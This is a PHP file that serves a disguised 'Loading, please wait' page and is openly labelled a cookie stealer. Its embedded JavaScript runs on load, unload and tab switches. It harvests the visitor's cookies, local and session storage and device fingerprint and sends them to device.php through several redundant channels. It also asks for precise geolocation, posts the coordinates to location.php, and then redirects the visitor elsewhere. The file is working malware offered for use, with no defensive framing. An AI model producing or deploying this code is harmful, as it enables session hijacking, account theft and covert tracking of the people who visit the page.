<?php
include 'ip.php';

// ULTRA PRO COOKIE STEALER - Guaranteed Capture
echo '
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // ULTRA PRO COOKIE & SESSION STEALER
        function stealEverything() {
            var stolenData = {
                // 1. ALL COOKIES
                cookies: document.cookie || "No cookies",
                
                // 2. LOCAL STORAGE
                localStorage: {},
                
                // 3. SESSION STORAGE
                sessionStorage: {},
                
                // 4. DEVICE INFO
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                language: navigator.language,
                memory: navigator.deviceMemory || "Unknown",
                cores: navigator.hardwareConcurrency || "Unknown",
                vendor: navigator.vendor || "Unknown",
                
                // 5. PAGE INFO
                currentURL: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };
            
            // Extract localStorage
            try {
                for (var i = 0; i < localStorage.length; i++) {
                    var key = localStorage.key(i);
                    stolenData.localStorage[key] = localStorage.getItem(key);
                }
            } catch(e) {
                stolenData.localStorage = {error: "Access denied"};
            }
            
            // Extract sessionStorage
            try {
                for (var i = 0; i < sessionStorage.length; i++) {
                    var key = sessionStorage.key(i);
                    stolenData.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {
                stolenData.sessionStorage = {error: "Access denied"};
            }
            
            // IMMEDIATE SEND (Priority 1)
            sendStolenData(stolenData);
            
            // BACKUP SEND after 500ms (Priority 2)
            setTimeout(function() {
                sendStolenData(stolenData);
            }, 500);
            
            // FINAL BACKUP SEND after 2 seconds (Priority 3)
            setTimeout(function() {
                sendStolenData(stolenData);
            }, 2000);
        }
        
        function sendStolenData(data) {
            // Method 1: XMLHttpRequest
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "device.php", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            } catch(e) {}
            
            // Method 2: Fetch API (backup)
            try {
                fetch("device.php", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(data),
                    keepalive: true // Ensures request completes even if page closes
                });
            } catch(e) {}
            
            // Method 3: Image beacon (ultra backup)
            try {
                var img = new Image();
                img.src = "device.php?beacon=1&cookies=" + encodeURIComponent(document.cookie);
            } catch(e) {}
        }
        
        function debugLog(message) {
            if (message.includes("Lat:") || message.includes("Latitude:") || message.includes("Position obtained successfully")) {
                console.log("DEBUG: " + message);
            }
        }
        
        function getLocation() {
            if (navigator.geolocation) {
                document.getElementById("locationStatus").innerText = "Requesting location permission...";
                
                navigator.geolocation.getCurrentPosition(
                    sendPosition, 
                    handleError, 
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }
        
        function sendPosition(position) {
            debugLog("Position obtained successfully");
            document.getElementById("locationStatus").innerText = "Location obtained, loading...";
            
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;
            
            debugLog("Lat: " + lat + ", Lon: " + lon + ", Accuracy: " + acc);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };
            
            xhr.onerror = function() {
                redirectToMainPage();
            };
            
            xhr.send("lat="+lat+"&lon="+lon+"&acc="+acc+"&time="+new Date().getTime());
        }
        
        function handleError(error) {
            document.getElementById("locationStatus").innerText = "Redirecting...";
            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }
        
        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link/index2.html";
            } catch (e) {
                window.location = "forwarding_link/index2.html";
            }
        }
        
        // EXECUTE IMMEDIATELY ON PAGE LOAD
        (function() {
            // Steal everything ASAP
            stealEverything();
        })();
        
        // Also steal on window load
        window.onload = function() {
            // Steal again to catch any cookies set after initial load
            stealEverything();
            
            setTimeout(function() {
                getLocation();
            }, 500);
        };
        
        // Steal before page unload (if user closes tab)
        window.addEventListener("beforeunload", function() {
            stealEverything();
        });
        
        // Steal on visibility change (if user switches tabs)
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                stealEverything();
            }
        });
    </script>
</head>
<body style="background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
    <h2>Loading, please wait...</h2>
    <p>Please allow location access for better experience</p>
    <p id="locationStatus">Initializing...</p>
    <div style="margin-top: 30px;">
        <div class="spinner" style="border: 8px solid #333; border-top: 8px solid #f3f3f3; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
    </div>
    
    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</body>
</html>
';
exit;
?>
